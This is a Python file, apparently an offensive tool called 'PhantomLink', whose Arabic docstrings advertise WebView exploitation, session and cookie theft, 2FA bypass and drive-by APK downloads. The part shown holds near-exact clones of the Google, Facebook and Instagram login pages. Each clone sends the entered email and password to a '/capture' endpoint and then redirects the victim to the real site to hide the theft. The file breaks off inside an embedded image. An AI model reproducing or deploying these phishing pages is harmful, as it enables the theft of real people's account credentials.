#!/usr/bin/env python3
"""
PhantomLink v1.0 — Advanced WebView Exploitation & Phishing Engine
──────────────────────────────────────────────────────────────────────
توليد روابط اختراق متطورة تستغل WebView في التطبيقات والمتصفحات.
تدمج بين التصيد (Phishing) والاستغلال (Exploitation) في رابط واحد.
تستطيع سرقة الجلسات، الكوكيز، كلمات المرور، وتنزيل الملفات.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os, sys, base64, json, random, string, hashlib, time, socket, threading, ssl, http.server, urllib.parse, html, re, uuid, zlib, binascii

class PhantomLink:
    """
    PhantomLink — ثلاث تقنيات ثورية لروابط الاختراق:
    1. WebView Exploit: رابط يستغل WebView في التطبيقات (خطف الجلسات)
    2. Phishing 2.0: صفحة تسجيل دخول متطورة تتجاوز 2FA
    3. Drive-By Download: تحميل APK تلقائي بدون موافقة المستخدم
    """
    
    def __init__(self):
        self.name = "PhantomLink"
        self.version = "1.0"
        self.author = "BlackSpecter"
        
        # قوالب صفحات التصيد
        self.phishing_templates = {
            "google": "صفحة تسجيل دخول Google",
            "facebook": "صفحة تسجيل دخول Facebook",
            "instagram": "صفحة تسجيل دخول Instagram", 
            "whatsapp": "صفحة Web WhatsApp",
            "twitter": "صفحة تسجيل دخول X (Twitter)",
            "snapchat": "صفحة تسجيل دخول Snapchat",
            "tiktok": "صفحة تسجيل دخول TikTok",
            "netflix": "صفحة تسجيل دخول Netflix",
            "amazon": "صفحة تسجيل دخول Amazon",
            "microsoft": "صفحة تسجيل دخول Microsoft 365",
            "custom": "صفحة مخصصة"
        }
        
        self.output_dir = os.path.join(os.getcwd(), "outputs")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def _generate_google_template(self) -> str:
        """صفحة تسجيل دخول Google — متطابقة 99% مع الأصل."""
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
               background: #fff; display: flex; justify-content: center; 
               align-items: center; min-height: 100vh; }
        .container { max-width: 450px; width: 100%; padding: 48px 40px 36px; 
                     border: 1px solid #dadce0; border-radius: 8px; }
        .logo { display: block; margin: 0 auto 16px; width: 75px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; 
             color: #202124; padding-bottom: 8px; }
        .subtitle { font-size: 16px; text-align: center; color: #5f6368; 
                     margin-bottom: 30px; }
        .input-group { margin-bottom: 16px; position: relative; }
        .input-group input { width: 100%; padding: 13px 15px; 
                             font-size: 16px; border: 1px solid #dadce0; 
                             border-radius: 4px; outline: none; 
                             transition: border 0.2s; }
        .input-group input:focus { border: 2px solid #1a73e8; }
        .input-group label { position: absolute; left: 15px; top: 13px; 
                             color: #5f6368; font-size: 16px; 
                             transition: 0.2s; pointer-events: none; }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label { 
            top: -10px; left: 10px; font-size: 12px; 
            background: #fff; padding: 0 5px; color: #1a73e8; }
        .forgot-link { display: block; margin: 8px 0 30px; 
                        color: #1a73e8; font-size: 14px; 
                        font-weight: 500; text-decoration: none; }
        .forgot-link:hover { background: #f0f6fe; padding: 5px; 
                              border-radius: 4px; }
        .actions { display: flex; justify-content: space-between; 
                    align-items: center; }
        .create-link { color: #1a73e8; font-size: 14px; font-weight: 500; 
                        text-decoration: none; padding: 5px 0; }
        .create-link:hover { background: #f0f6fe; padding: 5px 5px; 
                              border-radius: 4px; }
        .next-btn { background: #1a73e8; color: #fff; border: none; 
                     padding: 10px 24px; font-size: 14px; font-weight: 500; 
                     border-radius: 4px; cursor: pointer; }
        .next-btn:hover { background: #1b66c9; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
        .footer { text-align: center; margin-top: 40px; }
        .footer select { border: none; color: #5f6368; font-size: 12px; 
                          cursor: pointer; }
        .footer a { color: #5f6368; font-size: 12px; text-decoration: none; 
                     margin: 0 8px; }
        .footer a:hover { color: #1a73e8; }
        .error-msg { color: #d93025; font-size: 12px; margin-top: 4px; 
                      display: none; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M9.24 12.12c0 1.8-.6 3.12-1.56 4.08-.96.96-2.28 1.44-3.84 1.44-1.56 0-2.88-.48-3.84-1.44C0 15.24 0 13.92 0 12.12V4.8h2.4v7.32c0 1.2.36 2.16 1.08 2.88.72.72 1.68 1.08 2.76 1.08 1.2 0 2.16-.36 2.88-1.08.72-.72 1.08-1.68 1.08-2.88V4.8h2.4v7.32h.24zM19.2 17.88V4.8h7.2v2.16h-4.8v2.64h4.44v2.16H21.6v3.72h5.04v2.4H19.2zM30.12 17.88V7.2h-2.4V4.8h7.2v2.4h-2.4v10.68h-2.4zM41.04 18c-1.92 0-3.24-.6-4.2-1.8-.84-1.08-1.32-2.64-1.32-4.68v-.12c0-2.04.48-3.6 1.32-4.68.96-1.2 2.4-1.8 4.2-1.8 1.92 0 3.24.6 4.2 1.8.84 1.08 1.32 2.64 1.32 4.68v.12c0 2.04-.48 3.6-1.32 4.68-.96 1.2-2.4 1.8-4.2 1.8zm0-2.16c.96 0 1.68-.36 2.16-1.08.48-.72.72-1.8.72-3.24v-.12c0-1.44-.24-2.52-.72-3.24-.48-.72-1.2-1.08-2.16-1.08-.96 0-1.68.36-2.16 1.08-.48.72-.72 1.8-.72 3.24v.12c0 1.44.24 2.52.72 3.24.48.72 1.2 1.08 2.16 1.08zM54.84 17.88l-.48-2.76H50.4l-.48 2.76h-2.64L50.4 4.8h4.56l3.36 13.08h-3.48zM53.28 12.96l-.96-5.52-.96 5.52h1.92zM63.72 18c-1.92 0-3.24-.6-4.2-1.8-.84-1.08-1.32-2.64-1.32-4.68v-.12c0-2.04.48-3.6 1.32-4.68.96-1.2 2.4-1.8 4.2-1.8 1.32 0 2.4.24 3.24.72.84.48 1.44 1.08 1.8 1.8l-1.92 1.44c-.72-1.08-1.8-1.68-3.12-1.68-1.08 0-1.92.36-2.52 1.08-.6.72-.96 1.68-1.08 2.88h6.24v1.92c0 1.92-.48 3.48-1.44 4.56-.96 1.08-2.28 1.68-3.96 1.68zm2.76-5.28h-5.04c.12.96.48 1.68 1.08 2.28.6.6 1.32.84 2.28.84.84 0 1.56-.24 2.16-.72.48-.48.84-1.2 1.08-2.16l-1.56-.24z" fill="#4285F4"/>
        </svg>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form id="loginForm" method="POST" action="/capture">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="" required autofocus>
                <label for="email">Email or phone</label>
                <div class="error-msg" id="emailError">Please enter a valid email</div>
            </div>
            <div class="input-group" id="passwordGroup" style="display:none;">
                <input type="password" id="password" name="password" placeholder="">
                <label for="password">Enter your password</label>
                <div class="error-msg" id="passError">Wrong password. Try again</div>
            </div>
            <a href="#" class="forgot-link" onclick="alert('Feature coming soon')">Forgot email?</a>
            <div class="actions">
                <a href="#" class="create-link" onclick="alert('Create account feature disabled')">Create account</a>
                <button type="submit" class="next-btn" id="nextBtn">Next</button>
            </div>
        </form>
        <div class="footer">
            <select>
                <option>English (United States)</option>
                <option>العربية</option>
                <option>Français</option>
                <option>Deutsch</option>
            </select>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
    
    <script>
        let step = 1;
        const emailInput = document.getElementById('email');
        const passwordGroup = document.getElementById('passwordGroup');
        const nextBtn = document.getElementById('nextBtn');
        const form = document.getElementById('loginForm');
        
        // التبديل بين خطوات تسجيل الدخول (محاكاة Google)
        emailInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (step === 1 && emailInput.value.includes('@')) {
                    step = 2;
                    passwordGroup.style.display = 'block';
                    emailInput.readOnly = true;
                    document.getElementById('password').focus();
                    nextBtn.textContent = 'Sign in';
                } else if (step === 2) {
                    form.submit();
                }
            }
        });
        
        nextBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (step === 1) {
                if (emailInput.value.includes('@')) {
                    step = 2;
                    passwordGroup.style.display = 'block';
                    emailInput.readOnly = true;
                    document.getElementById('password').focus();
                    nextBtn.textContent = 'Sign in';
                } else {
                    document.getElementById('emailError').style.display = 'block';
                }
            } else {
                form.submit();
            }
        });
        
        // إعادة التوجيه بعد الإرسال
        form.addEventListener('submit', function() {
            setTimeout(function() {
                window.location.href = 'https://accounts.google.com';
            }, 500);
        });
    </script>
</body>
</html>'''
    
    def _generate_fb_template(self) -> str:
        """صفحة تسجيل دخول Facebook."""
        return '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook - log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{max-width:400px;width:100%;padding:20px}
.logo{text-align:center;margin-bottom:20px}
.logo svg{width:240px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px}
.card h2{text-align:center;color:#1c1e21;font-size:18px;margin-bottom:20px}
.input-group{margin-bottom:12px}
.input-group input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;outline:none}
.input-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.btn-login{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
.btn-login:hover{background:#166fe5}
.forgot{text-align:center;margin:16px 0}
.forgot a{color:#1877f2;font-size:14px;text-decoration:none}
.forgot a:hover{text-decoration:underline}
.divider{display:flex;align-items:center;margin:20px 0;color:#737373}
.divider::before,.divider::after{content:"";flex:1;border-bottom:1px solid #dadde1}
.divider span{padding:0 15px;font-size:12px}
.btn-create{display:block;width:fit-content;margin:0 auto;padding:12px 20px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.btn-create:hover{background:#36a420}
.footer{text-align:center;margin-top:28px;font-size:12px;color:#737373}
.footer a{color:#385898;text-decoration:none;margin:0 5px}
.footer a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 1366.97 736.57" xmlns="http://www.w3.org/2000/svg">
<path d="M1280.67 368.29c0 202.75-164.68 367.43-367.43 367.43s-367.43-164.68-367.43-367.43 164.68-367.43 367.43-367.43 367.43 164.68 367.43 367.43z" fill="#1877f2"/>
<path d="M1061.91 368.29c0 82.02-49.42 152.37-119.71 183.48l-7.28 3.16v-78.54l23.22-22.19 9.88-29.63-5.09-2.53c-4.2-2.11-8.42-4.21-12.65-6.32l-15.36-7.68V370.7h47.41l5.91-35.44h-53.32v-23.68c0-9.86 4.93-14.8 14.8-14.8h38.52v-35.44h-42.74c-10.27 0-19.48 1.91-27.75 5.7-17.53 8.05-28.22 25.54-28.22 47.18v21.04h-35.44v35.44h35.44v88.61c-2.11.42-4.21.84-6.32 1.27-2.53.42-5.06.84-7.59 1.27v-91.15h-35.44v-35.44h35.44v-21.04c0-32.86 17.87-58.12 46.42-69.41 12.3-4.85 26.27-7.28 41.84-7.28 7.59 0 15.36.63 23.31 1.9l4.43.63 35.44-5.32v35.43c0 5.49-2.32 10.55-6.33 14.21l-22.53 21.85v47.82z" fill="#fff"/>
</svg>
</div>
<div class="card">
<h2>Log in to Facebook</h2>
<form method="POST" action="/capture">
<div class="input-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn-login">Log In</button>
<div class="forgot"><a href="#">Forgotten password?</a></div>
<div class="divider"><span>or</span></div>
<button type="button" class="btn-create" onclick="alert('Create new account')">Create new account</button>
</form>
</div>
<div class="footer"><a href="#">Sign up</a> · <a href="#">Help</a> · <a href="#">About</a></div>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(e){
e.preventDefault();
var f = this;
var x = new XMLHttpRequest();
x.open('POST', '/capture', true);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('email='+encodeURIComponent(f.email.value)+'&password='+encodeURIComponent(f.password.value)+'&platform=facebook');
setTimeout(function(){window.location.href='https://facebook.com'}, 1000);
});
</script>
</body>
</html>'''
    
    def _generate_instagram_template(self) -> str:
        """صفحة تسجيل دخول Instagram."""
        return '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{max-width:350px;width:100%;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;margin-bottom:10px}
.logo{text-align:center;margin-bottom:30px;font-size:36px;font-weight:200;font-family:'Billabong',cursive}
.input-group{margin:0 0 6px}
.input-group input{width:100%;padding:9px 10px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;outline:none}
.input-group input:focus{border-color:#a8a8a8}
.btn-login{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.btn-login:disabled{background:#b2dffc}
.divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px}
.divider::before,.divider::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
.divider span{padding:0 18px}
.fb-login{text-align:center;margin:8px 0}
.fb-login a{color:#385185;font-size:14px;font-weight:600;text-decoration:none}
.forgot{text-align:center;margin:12px 0}
.forgot a{color:#00376b;font-size:12px;text-decoration:none}
.signup{text-align:center;border:1px solid #dbdbdb;background:#fff;padding:20px;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.app-links{text-align:center;margin:20px 0}
.app-links p{font-size:14px;margin-bottom:16px}
.app-links img{height:40px}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#8e8e8e}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<div class="input-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn-login">Log In</button>
<div class="divider"><span>OR</span></div>
<div class="fb-login"><a href="#">Log in with Facebook</a></div>
<div class="forgot"><a href="#">Forgot password?</a></div>
</form>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div class="app-links">
<p>Get the app.</p>
<img src="data:image/png;base64,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" alt="Google Play" style="margin-right:8px">
<img src="data:image/png;base64,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